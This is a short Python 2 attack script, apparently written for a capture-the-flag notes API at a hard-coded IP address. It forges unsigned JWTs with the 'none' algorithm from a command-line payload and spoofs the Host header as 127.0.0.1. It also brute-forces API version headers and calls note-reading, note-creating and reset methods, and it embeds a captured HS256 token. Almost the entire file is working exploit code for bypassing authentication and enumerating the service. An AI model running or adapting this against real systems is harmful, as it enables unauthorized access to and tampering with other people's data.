import requests
import sys
import json
import base64

'''
v1 and v2 are valid
'''

api = "http://159.203.178.9/rpc.php"

if sys.argv[1]:
	print sys.argv[1]
	club = sys.argv[1]
	#f = sys.argv[1]
	#club = '{"id":'+f+'}'
	haha = base64.b64encode(club).strip('=')
	token_jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0."+haha+"."
	print token_jwt
	header1 = {"Host":"127.0.0.1", "Accept":"application/notes.api.v1+json", "Authorization":token_jwt}
	header22 = {"Host":"127.0.0.1", "Accept":"application/notes.api.v2+json", "Authorization":token_jwt}
#else:
#	header1 = {"Host":"159.203.178.9", "Accept":"application/notes.api.v1+json", "Authorization":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6Mn0.t4M7We66pxjMgRNGg1RvOmWT6rLtA8ZwJeNP-S8pVak"}
 #       header22 = {"Host":"159.203.178.9", "Accept":"application/notes.api.v2+json", "Authorization":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6Mn0.t4M7We66pxjMgRNGg1RvOmWT6rLtA8ZwJeNP-S8pVak"}

def versioning(identity):
	print "\n[*]Get that note v1: "
	r = requests.get(api+"?method=getNote&id="+identity, headers=header1)
	print r.text+" with "+str(r.status_code)
	print "\n[*] Get that note v2: "
	r = requests.get(api+"?method=getNote&id="+identity, headers=header22)
	print r.text+" with "+str(r.status_code)+"\n"

def getMetadata(version,brute):
	print "\n[*] GetMetaData Called"
	header_nice={"Host":"159.203.178.9", "Accept":"application/notes.api.v"+str(version)+"+json", "Authorization":"eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpZCI6MX0."}
	print "\n[*] GetMetaData with v1 called: "
	r = requests.get(api+"?method=getNotesMetadata", headers=header1)
	print r.text+" with "+str(r.status_code)+"\n"
	print "\n[*] GetMetaData with v2 called: "
	r = requests.get(api+"?method=getNotesMetadata", headers=header22)
	print r.text+" with "+str(r.status_code)+"\n"

	if r.status_code == 200 and brute:
		print "[-] Version Mismatch.. Trying to Brute\n"
		for i in xrange(2,100):
			header2={"Host":"159.203.178.9", "Accept":"application/notes.api.v"+str(i)+"+json", "Authorization":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6Mn0.t4M7We66pxjMgRNGg1RvOmWT6rLtA8ZwJeNP-S8pVak"}
			r1 = requests.get(api+"?method=getNotesMetadata", headers=header2)
			if r1.status_code != 415:
				print str(r1.status_code) + " for v"+str(i)+" \n"

def createNote(jsin):
	print "Your Payload "+str(jsin)
#	print "[*] Posting with v1"
#	r = requests.post(api+"?method=createNote", headers=header1, json=jsin)
#	print r.text+" with "+str(r.status_code) 
	print "\n[*] Posting with v2"
	r = requests.post(api+"?method=createNote", headers=header22, json=jsin)
	print r.text+" with "+str(r.status_code)


def reset():
	print "[*] Reset Called\n"
	r = requests.post(api+"?method=resetNotes", headers=header1)
	print r.text+" with "+str(r.status_code)

#versioning("1")
getMetadata(2,False)
#getMetadata(1, False)
#createNote({"note":"b"})
#createNote({"note":"wtfitworks"})
#createNote({"id":"f", "note":".."})
#reset()
